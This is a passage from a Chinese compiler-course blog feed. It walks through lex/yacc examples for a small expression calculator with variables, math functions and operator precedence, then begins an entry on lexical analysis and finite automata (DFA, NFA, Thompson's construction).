class="hljs-string">&quot;a=2+3+5&quot;</span> | ./simple-<span class="hljs-built_in">expr</span><br></code></pre></td></tr></table></figure><p>bison -d 参数指定要输出 <em>simple-expr.tab.h</em> 文件，这个文件包含了必要的定义，可以给 lex 使用，比如 token 的定义。</p><h2 id="simple-varexpr"><a href="#simple-varexpr" class="headerlink" title="simple-varexpr"></a>simple-varexpr</h2><p>上一个例子只求值没有赋值，这个例子是给变量赋值。</p><p>yacc 中数据类型的定义方法如下：</p><p><em>%union</em> 可以改变 yylval 的数据类型。 yylval 默认类型是 int。用 %union 可以将不同类型聚合在一起。</p><p><em>%type</em> 可以为非终结符的附加数据定义数据类型，只能是 <em>%union</em> 中定义的数据类型。</p><p>例如 yacc 中 %union 和 %type 定义如下</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">%<span class="hljs-keyword">union</span> &#123;<br>  <span class="hljs-type">int</span> rvalue; <span class="hljs-comment">/* value of evaluated expression */</span><br>  <span class="hljs-type">int</span> lvalue; <span class="hljs-comment">/* index into symtbl for variable name */</span><br>&#125;<br><br>%token &lt;rvalue&gt; NUMBER<br>%token &lt;lvalue&gt; <span class="hljs-type">NAME</span><br><span class="hljs-meta">%type</span> &lt;rvalue&gt; expression<br></code></pre></td></tr></table></figure><p>非终结符 NUMBER 的类型为 rvalue</p><p>非终结符 NAME 的类型为 lvalue</p><p>非终结符 expression 的类型为  rvalue</p><p>lex 中对 NUMBER 和 NAME 解析赋值方法:yylval.rvalue, yylval.lvalue</p><p>varexpr 完整 yacc 代码如下:</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">%&#123;<br><span class="hljs-meta">#include &lt;stdio.h&gt;</span><br><span class="hljs-meta">#include &lt;stdbool.h&gt;</span><br><span class="hljs-type">int</span> symtbl[<span class="hljs-number">26</span>];<br><span class="hljs-type">bool</span> issym[<span class="hljs-number">26</span>];<br><br><span class="hljs-type">int</span> yylex(<span class="hljs-type">void</span>);<br><span class="hljs-type">int</span> yyerror(<span class="hljs-type">char</span> *);<br>%&#125;<br><br>%<span class="hljs-keyword">union</span> &#123;<br>  <span class="hljs-type">int</span> rvalue; <span class="hljs-comment">/* value of evaluated expression */</span><br>  <span class="hljs-type">int</span> lvalue; <span class="hljs-comment">/* index into symtbl for variable name */</span><br>&#125;<br><br>%token &lt;rvalue&gt; NUMBER<br>%token &lt;lvalue&gt; <span class="hljs-type">NAME</span> <br><br><span class="hljs-meta">%type</span> &lt;rvalue&gt; expression<br><br>%%<br><span class="hljs-keyword">statement</span>: <span class="hljs-type">NAME</span> <span class="hljs-string">&#x27;=&#x27;</span> expression &#123; symtbl[<span class="hljs-meta">$1</span>] = <span class="hljs-meta">$3</span>; issym[<span class="hljs-meta">$1</span>] = <span class="hljs-keyword">true</span>; &#125;<br>         | expression  &#123; printf(&quot;%d\n&quot;, <span class="hljs-meta">$1</span>); &#125;<br>         ;<br><br>expression: expression <span class="hljs-string">&#x27;+&#x27;</span> NUMBER &#123; $$<span class="pgsql"> = <span class="hljs-meta">$1</span> + <span class="hljs-meta">$3</span>; &#125;</span><br><span class="pgsql">         | expression <span class="hljs-string">&#x27;-&#x27;</span> NUMBER &#123; $$</span> = <span class="hljs-meta">$1</span> - <span class="hljs-meta">$3</span>; &#125;<br>         | NUMBER &#123; $$<span class="pgsql"> = <span class="hljs-meta">$1</span>; &#125;</span><br>         ;<br><span class="r">%%</span><br></code></pre></td></tr></table></figure><p>symtbl 用于保存对应符号的值，issym 用于记录对应符号是否定义。</p><p>lex 代码如下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c++">%&#123;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;simple-varexpr.tab.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;math.h&gt;</span></span><br>%&#125;<br><br>%%<br>[<span class="hljs-number">0</span><span class="hljs-number">-9</span>]+    &#123; yylval.rvalue = atoi(yytext); <span class="hljs-keyword">return</span> NUMBER; &#125; <span class="hljs-comment">/* convert NUMBER token value to integer */</span><br>[ \t\n]   ;  <span class="hljs-comment">/* ignore whitespace */</span><br>[a-z]     &#123; yylval.lvalue = yytext[<span class="hljs-number">0</span>] - <span class="hljs-string">&#x27;a&#x27;</span>; <span class="hljs-keyword">return</span> NAME; &#125; <span class="hljs-comment">/* convert NAME token into index */</span><br>.         <span class="hljs-keyword">return</span> yytext[<span class="hljs-number">0</span>];<br>%%<br></code></pre></td></tr></table></figure><p>非终结符 NUMBER 的类型是 rvalue，使用 yylval.rvalue 对解析树赋值。</p><p>非终结符 NAME 的类型是 lvalue， 使用 yylval.lvalue 对解析树赋值。</p><h3 id="进一步实现-varexpr"><a href="#进一步实现-varexpr" class="headerlink" title="进一步实现 varexpr"></a>进一步实现 varexpr</h3><p>上面的代码只实现了单行对变量赋值，如何进一步实现多行赋值？如何实现变量引用？实现下面这种输入的解析。</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;a=10\nb=a+10&quot;</span> | <span class="hljs-string">./simple-varexpr</span><br></code></pre></td></tr></table></figure><h3 id="实现思路"><a href="#实现思路" class="headerlink" title="实现思路"></a>实现思路</h3><h4 id="多行"><a href="#多行" class="headerlink" title="多行"></a>多行</h4><p>添加一条递归规则:</p><p><code>statementList: statement|statementList statement;</code></p><p>也可以这样写:</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs 1c">statement_list : statement &#x27;\n&#x27; statement_list<br>   <span class="hljs-string">|</span><br>   ;<br></code></pre></td></tr></table></figure><h4 id="符号计算"><a href="#符号计算" class="headerlink" title="符号计算"></a>符号计算</h4><p>添加一条 realNum 规则用来处理值与 NAME，如果是 NAME 则判断是否已经定义。hhh 处理方法可能有点沙雕。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c++">realNum: NUMBER &#123; $$ = $<span class="hljs-number">1</span>; &#125;<br>      | NAME &#123;<br>        <span class="hljs-keyword">if</span> (!issym[$<span class="hljs-number">1</span>])&#123;<br>          <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Undefined symbol:%c \n&quot;</span>, <span class="hljs-string">&#x27;a&#x27;</span> + $<span class="hljs-number">1</span>);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>          $$ = symtbl[$<span class="hljs-number">1</span>];<br>        &#125;<br>      &#125;<br></code></pre></td></tr></table></figure><p>完整的 yacc 代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c++">%&#123;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdbool.h&gt;</span></span><br><span class="hljs-keyword">int</span> symtbl[<span class="hljs-number">26</span>];<br><span class="hljs-keyword">bool</span> issym[<span class="hljs-number">26</span>];<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">yylex</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">yyerror</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *)</span></span>;<br>%&#125;<br><br>%<span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>  <span class="hljs-keyword">int</span> rvalue; <span class="hljs-comment">/* value of evaluated expression */</span><br>  <span class="hljs-keyword">int</span> lvalue; <span class="hljs-comment">/* index into symtbl for variable name */</span><br>&#125;<br><br>%token &lt;rvalue&gt; NUMBER<br>%token &lt;lvalue&gt; NAME <br><br>%type &lt;rvalue&gt; expression<br>%type &lt;rvalue&gt; realNum<br><br>%%<br>statementList: statement|statementList statement;<br>statement: NAME <span class="hljs-string">&#x27;=&#x27;</span> expression &#123; symtbl[$<span class="hljs-number">1</span>] = $<span class="hljs-number">3</span>; issym[$<span class="hljs-number">1</span>] = <span class="hljs-literal">true</span>; <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c = %d\n&quot;</span>, $<span class="hljs-number">1</span> + <span class="hljs-string">&#x27;a&#x27;</span>, $<span class="hljs-number">3</span>); &#125;<br>         | expression  &#123; <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, $<span class="hljs-number">1</span>);  &#125;<br>         ;<br><br>expression: expression <span class="hljs-string">&#x27;+&#x27;</span> realNum &#123; $$ = $<span class="hljs-number">1</span> + $<span class="hljs-number">3</span>;&#125;<br>         | expression <span class="hljs-string">&#x27;-&#x27;</span> realNum &#123; $$ = $<span class="hljs-number">1</span> - $<span class="hljs-number">3</span>; &#125;<br>         | realNum<br>         ;<br><br>realNum: NUMBER &#123; $$ = $<span class="hljs-number">1</span>; &#125;<br>      | NAME &#123;<br>        <span class="hljs-keyword">if</span> (!issym[$<span class="hljs-number">1</span>])&#123;<br>          <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Undefined symbol:%c \n&quot;</span>, <span class="hljs-string">&#x27;a&#x27;</span> + $<span class="hljs-number">1</span>);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>          $$ = symtbl[$<span class="hljs-number">1</span>];<br>        &#125;<br>      &#125;<br>%%<br></code></pre></td></tr></table></figure><h2 id="Adding-Functions-to-your-Expression-Interpreter"><a href="#Adding-Functions-to-your-Expression-Interpreter" class="headerlink" title="Adding Functions to your Expression Interpreter"></a>Adding Functions to your Expression Interpreter</h2><p>实现 exp, sqrt, log 等函数。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c++">a = <span class="hljs-number">2.0</span><br>b = <span class="hljs-built_in">exp</span>(a)<br></code></pre></td></tr></table></figure><p>实现思路很简单，添加 exp, sqrt, log 对应的 token, 语法分析阶段添加对应的规则。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs c++">%&#123;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;exprdefs.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;cstdlib&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;cstdio&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;cmath&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">yylex</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">yyerror</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *)</span></span>; <br><br> <span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<br><br> <span class="hljs-keyword">double</span> symtbl[<span class="hljs-number">26</span>];<br> <span class="hljs-keyword">bool</span> issym[<span class="hljs-number">26</span>];<br><br>%&#125;<br><br>%<span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>  <span class="hljs-keyword">int</span> rvalue; <span class="hljs-comment">/* int value of evaluated expression */</span><br>  <span class="hljs-keyword">double</span> dbl_rvalue; <span class="hljs-comment">/* value of type double for evaluated expression */</span><br>  <span class="hljs-keyword">int</span> lvalue; <span class="hljs-comment">/* index into symtbl for variable name */</span><br>&#125;<br><br>%token &lt;dbl_rvalue&gt; T_DOUBLE<br>%token &lt;rvalue&gt; T_NUMBER<br>%token &lt;lvalue&gt; T_NAME<br>%token T_EXP T_SQRT T_LOG<br><br>%type &lt;dbl_rvalue&gt; expression<br><br>%%<br>statement_list : statement <span class="hljs-string">&#x27;\n&#x27;</span> statement_list<br>   |<br>   ;<br><br>statement: T_NAME <span class="hljs-string">&#x27;=&#x27;</span> expression &#123; symtbl[$<span class="hljs-number">1</span>] = $<span class="hljs-number">3</span>; issym[$<span class="hljs-number">1</span>] = <span class="hljs-literal">true</span>; &#125;<br>   | expression  &#123; <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%lf\n&quot;</span>, $<span class="hljs-number">1</span>); &#125;<br>   ;<br><br>expression: expression <span class="hljs-string">&#x27;+&#x27;</span> T_NUMBER &#123; $$ = $<span class="hljs-number">1</span> + $<span class="hljs-number">3</span>; &#125;<br>   | expression <span class="hljs-string">&#x27;-&#x27;</span> T_NUMBER &#123; $$ = $<span class="hljs-number">1</span> - $<span class="hljs-number">3</span>; &#125;<br>   | expression <span class="hljs-string">&#x27;+&#x27;</span> T_DOUBLE &#123; $$ = $<span class="hljs-number">1</span> + $<span class="hljs-number">3</span>; &#125;<br>   | expression <span class="hljs-string">&#x27;-&#x27;</span> T_DOUBLE &#123; $$ = $<span class="hljs-number">1</span> - $<span class="hljs-number">3</span>; &#125;<br>   | expression <span class="hljs-string">&#x27;+&#x27;</span> T_NAME <br> &#123; <br>    <span class="hljs-keyword">if</span> (issym[$<span class="hljs-number">3</span>]) &#123; $$ = $<span class="hljs-number">1</span> + symtbl[$<span class="hljs-number">3</span>]; &#125; <br>    <span class="hljs-keyword">else</span> &#123; <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Error: variable %c not previously defined\n&quot;</span>, $<span class="hljs-number">3</span>+<span class="hljs-string">&#x27;a&#x27;</span>); <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>); &#125;<br> &#125;<br>   | expression <span class="hljs-string">&#x27;-&#x27;</span> T_NAME <br> &#123; <br>    <span class="hljs-keyword">if</span> (issym[$<span class="hljs-number">3</span>]) &#123; $$ = $<span class="hljs-number">1</span> - symtbl[$<span class="hljs-number">3</span>]; &#125; <br>    <span class="hljs-keyword">else</span> &#123; <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Error: variable %c not previously defined\n&quot;</span>, $<span class="hljs-number">3</span>+<span class="hljs-string">&#x27;a&#x27;</span>); <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>); &#125;<br> &#125;<br>   | T_NUMBER &#123; $$ = $<span class="hljs-number">1</span>; &#125;<br>   | T_DOUBLE &#123; $$ = $<span class="hljs-number">1</span>; &#125;<br>   | T_NAME <br> &#123; <br>    <span class="hljs-keyword">if</span> (issym[$<span class="hljs-number">1</span>]) &#123; $$ = symtbl[$<span class="hljs-number">1</span>]; &#125; <br>    <span class="hljs-keyword">else</span> &#123; <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Error: variable %c not previously defined\n&quot;</span>, $<span class="hljs-number">1</span>+<span class="hljs-string">&#x27;a&#x27;</span>); <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>); &#125;<br> &#125;<br>   | T_EXP <span class="hljs-string">&#x27;(&#x27;</span> expression <span class="hljs-string">&#x27;)&#x27;</span> &#123; $$ = <span class="hljs-built_in">exp</span>($<span class="hljs-number">3</span>); &#125;<br>   | T_SQRT <span class="hljs-string">&#x27;(&#x27;</span> expression <span class="hljs-string">&#x27;)&#x27;</span> &#123; $$ = <span class="hljs-built_in">sqrt</span>($<span class="hljs-number">3</span>); &#125;<br>   | T_LOG <span class="hljs-string">&#x27;(&#x27;</span> expression <span class="hljs-string">&#x27;)&#x27;</span> &#123; $$ = <span class="hljs-built_in">log</span>($<span class="hljs-number">3</span>); &#125;<br>   ;<br><br>%%<br></code></pre></td></tr></table></figure><p>lex 代码如下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c++">%&#123;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;exprdefs.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;expr-interpreter.tab.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;cmath&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;cstdlib&gt;</span></span><br><br>  <span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<br><br>  <span class="hljs-keyword">extern</span> <span class="hljs-keyword">double</span> symtbl[<span class="hljs-number">26</span>];<br><br>%&#125;<br><br>%%<br><span class="hljs-built_in">exp</span>       &#123; <span class="hljs-keyword">return</span> T_EXP; &#125;<br><span class="hljs-built_in">sqrt</span>      &#123; <span class="hljs-keyword">return</span> T_SQRT; &#125;<br><span class="hljs-built_in">log</span>       &#123; <span class="hljs-keyword">return</span> T_LOG; &#125;<br>[<span class="hljs-number">0</span><span class="hljs-number">-9</span>]*\.[<span class="hljs-number">0</span><span class="hljs-number">-9</span>]+  &#123; yylval.dbl_rvalue = atof(yytext); <span class="hljs-keyword">return</span> T_DOUBLE; &#125; <span class="hljs-comment">/* convert token value to double */</span><br>[<span class="hljs-number">0</span><span class="hljs-number">-9</span>]+    &#123; yylval.rvalue = atoi(yytext); <span class="hljs-keyword">return</span> T_NUMBER; &#125; <span class="hljs-comment">/* convert token value to integer */</span><br>[ \t]     ;  <span class="hljs-comment">/* ignore whitespace */</span><br>[a-z]     &#123; yylval.lvalue = yytext[<span class="hljs-number">0</span>] - <span class="hljs-string">&#x27;a&#x27;</span>; <span class="hljs-keyword">return</span> T_NAME; &#125; <span class="hljs-comment">/* convert token into index */</span><br>\n |<br>.         <span class="hljs-keyword">return</span> yytext[<span class="hljs-number">0</span>];<br>%%<br><br></code></pre></td></tr></table></figure><h2 id="实现优先级和结合性"><a href="#实现优先级和结合性" class="headerlink" title="实现优先级和结合性"></a>实现优先级和结合性</h2><p>参考文章:<a href="https://www.epaperpress.com/lexandyacc/pry2.html">https://www.epaperpress.com/lexandyacc/pry2.html</a></p><p>添加运算符 * /</p><p>yacc 使用 %left (%right 右结合) 指定运算符优先级</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mel">%left <span class="hljs-string">&#x27;+&#x27;</span> <span class="hljs-string">&#x27;-&#x27;</span><br>%left <span class="hljs-string">&#x27;*&#x27;</span> <span class="hljs-string">&#x27;/&#x27;</span><br>%left UMINUS<br><br></code></pre></td></tr></table></figure><p>改写规则如下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c++">expression:realNum<br>         | expression <span class="hljs-string">&#x27;+&#x27;</span> expression &#123; $$ = $<span class="hljs-number">1</span> + $<span class="hljs-number">3</span>; &#125;<br>         | expression <span class="hljs-string">&#x27;-&#x27;</span> expression &#123; $$ = $<span class="hljs-number">1</span> - $<span class="hljs-number">3</span>; &#125;<br>         | expression <span class="hljs-string">&#x27;*&#x27;</span> expression &#123; $$ = $<span class="hljs-number">1</span> * $<span class="hljs-number">3</span>; &#125;<br>         | expression <span class="hljs-string">&#x27;/&#x27;</span> expression &#123; $$ = $<span class="hljs-number">1</span> / $<span class="hljs-number">3</span>; &#125;<br>         | <span class="hljs-string">&#x27;-&#x27;</span> expression %prec UMINUS &#123; $$ = -$<span class="hljs-number">2</span>; &#125;<br>         | <span class="hljs-string">&#x27;(&#x27;</span> expression <span class="hljs-string">&#x27;)&#x27;</span> &#123; $$ = $<span class="hljs-number">2</span>; &#125; <br>         ;<br></code></pre></td></tr></table></figure><p>注意一元运算符比较特殊</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mel">%left UMINUS<br>.....<br><span class="hljs-string">&#x27;-&#x27;</span> <span class="hljs-keyword">expression</span> %prec UMINUS &#123; $$ = -$2; &#125;<br></code></pre></td></tr></table></figure><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="http://anoopsarkar.github.io/compilers-class/yacc-practice.html">http://anoopsarkar.github.io/compilers-class/yacc-practice.html</a></p><p><a href="https://www.jianshu.com/p/1fe5a61fd9dc">https://www.jianshu.com/p/1fe5a61fd9dc</a></p><p><a href="https://stackoverflow.com/questions/1853204/yylval-and-union">https://stackoverflow.com/questions/1853204/yylval-and-union</a></p><p><a href="https://www.epaperpress.com/lexandyacc/calc2.html">https://www.epaperpress.com/lexandyacc/calc2.html</a></p>]]></content>
    
    
    <categories>
      
      <category>compiler</category>
      
    </categories>
    
    
    <tags>
      
      <tag>homework</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Lexical Analysis</title>
    <link href="/2020/12/31/lexical/"/>
    <url>/2020/12/31/lexical/</url>
    
    <content type="html"><![CDATA[<h1 id="Lexical-Analysis"><a href="#Lexical-Analysis" class="headerlink" title="Lexical Analysis"></a>Lexical Analysis</h1><h2 id="序"><a href="#序" class="headerlink" title="序"></a>序</h2><p>我最近在学习 SFU 的 Compiler 课程。由于疫情缘故， SFU 的 Compiler 课程在线上进行，才让我有机会白嫖到这门课程。 这门课程理论与实践结合，课程作业提供了详细的文档、测试程序以及 testcase。</p><p>课程主页地址<br><a href="http://anoopsarkar.github.io/compilers-class/syllabus.html">http://anoopsarkar.github.io/compilers-class/syllabus.html</a></p><h2 id="Lexical-analysis"><a href="#Lexical-analysis" class="headerlink" title="Lexical analysis"></a>Lexical analysis</h2><p>Lexical analysis （词法分析）是编译的第一个阶段，输入字符串流，输出等价的 Token 列表。关键字、标识符、数字常量、字符串常量等等都是一个 Token。部分 Token 还需要附加值属性才能完整表示。比如一个表示数字的 Token 还应该有对应的值属性。</p><img src="/2020/12/31/lexical/image-20210101234908658.png" class="" title="image-20210101234908658"><p>正则表达式能很好地胜任 Token 识别工作，日常开发任务中经常使用正则表达式识别手机号、数字、邮箱等等。编译则利用正则表达式识别 Token。</p><h3 id="词法分析器如何使用正则表达式识别-Token？"><a href="#词法分析器如何使用正则表达式识别-Token？" class="headerlink" title="词法分析器如何使用正则表达式识别 Token？"></a>词法分析器如何使用正则表达式识别 Token？</h3><ol><li><p>每一个 Token 都对应一个正则表达式， 最终将所有 Token 的正则表达式组合起来构成一个能识别所有 Token 的正则表达式。</p></li><li><p>匹配字符串长度最长的 Token</p></li><li><p>相同字符串匹配长度的 Token，匹配优先级高的 Token</p></li><li><p>加入错误处理机制，比如提示错误</p></li></ol><h2 id="Finite-state-automata"><a href="#Finite-state-automata" class="headerlink" title="Finite state automata"></a>Finite state automata</h2><p>正则表达式背后的原理是有限状态自动机(FA)，利用 FA 理论可以实现正则表达式。学习 FA 可以深入理解词法分析的工作原理。</p><p>FA 有两种:</p><ol><li>确定有限状态自动机 Deterministic (DFA)</li><li>非确定有限状态自动机 Non-deterministic (NFA)</li></ol><h3 id="FA-的基本结构"><a href="#FA-的基本结构" class="headerlink" title="FA 的基本结构"></a>FA 的基本结构</h3><ol><li>输入字符表</li><li>有限状态集合</li><li>转移函数</li><li>开始状态</li><li>结束状态</li></ol><h3 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h3><p>双圆圈为结束状态</p><img src="/2020/12/31/lexical/image-20210102001316806.png" class="" title="image-20210102001316806"><img src="/2020/12/31/lexical/image-20210102001328480.png" class="" title="image-20210102001328480"><img src="/2020/12/31/lexical/image-20210102001401036.png" class="" title="image-20210102001401036"><h3 id="特殊的-ε-move"><a href="#特殊的-ε-move" class="headerlink" title="特殊的 ε-move"></a>特殊的 ε-move</h3><img src="/2020/12/31/lexical/image-20210102001546935.png" class="" title="image-20210102001546935"><h2 id="DFA-amp-NFA"><a href="#DFA-amp-NFA" class="headerlink" title="DFA &amp; NFA"></a>DFA &amp; NFA</h2><p>确定有限状态自动机 Deterministic (DFA)<br>遵循两个原则:</p><ol><li>每个一个状态的每一个输入只有一个对应的转移状态</li><li>没有  ε-move</li></ol><img src="/2020/12/31/lexical/image-20210102002252030.png" class="" title="image-20210102002252030"><p>NFA 则支持多个状态转移和ε-move</p><img src="/2020/12/31/lexical/image-20210102002356893.png" class="" title="image-20210102002356893"><p>NFA 构造方便，而 DFA 编程方便，效率高。因此，一般操作如下<br>正则 pattern -&gt; NFA -&gt; DFA</p><h2 id="NFA-转-DFA-方法：子集构造法"><a href="#NFA-转-DFA-方法：子集构造法" class="headerlink" title="NFA 转 DFA 方法：子集构造法"></a>NFA 转 DFA 方法：子集构造法</h2><img src="/2020/12/31/lexical/image-20210102003051864.png" class="" title="image-20210102003051864"><h2 id="正则表达式转-NFA"><a href="#正则表达式转-NFA" class="headerlink" title="正则表达式转 NFA"></a>正则表达式转 NFA</h2><p>方法：Thompson’s construction<br><a href="https://en.wikipedia.org/wiki/Thompson%27s_construction">https://en.wikipedia.org/wiki/Thompson%27s_construction</a></p><img src="/2020/12/31/lexical/image-20210102004051943.png" class="" title="image-20210102004051943"><img 